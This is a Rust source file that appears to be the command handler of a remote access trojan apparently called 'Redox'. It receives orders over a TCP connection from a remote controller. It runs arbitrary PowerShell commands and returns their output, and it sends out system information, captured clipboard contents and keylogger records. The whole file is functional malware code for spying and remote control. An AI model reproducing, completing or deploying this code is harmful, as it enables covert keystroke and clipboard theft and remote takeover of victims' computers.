use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use tokio::net::TcpStream;
use Redox::schema::key_logger::KeyLoggData;
use Redox::schema::sys::SysInfo;
use Redox::utils::network::send_text;
use Redox::ReturnedData;
use crate::clipboard::clip_map_to_json;

pub async fn handle_recived_data(
    tcp_stream: &mut TcpStream,
    data: ReturnedData,
    key_log_mem: Arc<Mutex<Vec<KeyLoggData>>>,
    clipboard_mem: Arc<Mutex<HashMap<String, String>>>,
) {
    let command = String::from_utf8(data.data).unwrap();
    match data.datatype.as_str() {
        "2" => {
            handle_shell(tcp_stream, command).await;
        }
        "3" => {
            handle_get_system_info(tcp_stream).await;
        }
        "4" => {
            handle_get_clipboard(tcp_stream, command, clipboard_mem.clone()).await;
        }
        "5" => {
            handle_get_keylog(tcp_stream,  command, key_log_mem.clone()).await;
        }
        _ => {
            // handle_unknown(tcp_stream, command).await;
        }
    }
}

async fn handle_get_keylog(tcp_stream: &mut TcpStream, _: String, key_log_mem: Arc<Mutex<Vec<KeyLoggData>>>) {
    let data = KeyLoggData::vec_to_json(key_log_mem.lock().unwrap().clone());
    send_text(tcp_stream, data.to_string().as_str()).await.unwrap()
}

async fn handle_get_clipboard(tcp_stream: &mut TcpStream, _: String, clipboard_mem: Arc<Mutex<HashMap<String, String>>>) {
    let data = clip_map_to_json(clipboard_mem.lock().unwrap().clone());
    send_text(tcp_stream, &data.to_string()).await.unwrap();
}

pub async fn handle_get_system_info(tcp_stream: &mut TcpStream) {
    println!("aa");
    let system_info = SysInfo::get().to_json().to_string();
    send_text(tcp_stream, &system_info).await.unwrap();
}

pub async fn handle_shell(tcp_stream: &mut TcpStream, command: String) {
    let output = std::process::Command::new("powershell")
        .arg("-c")
        .arg(command)
        .output()
        .expect("failed to execute process");
    let output = output.stdout;
    send_text(tcp_stream, &String::from_utf8(output).unwrap()).await.unwrap();
}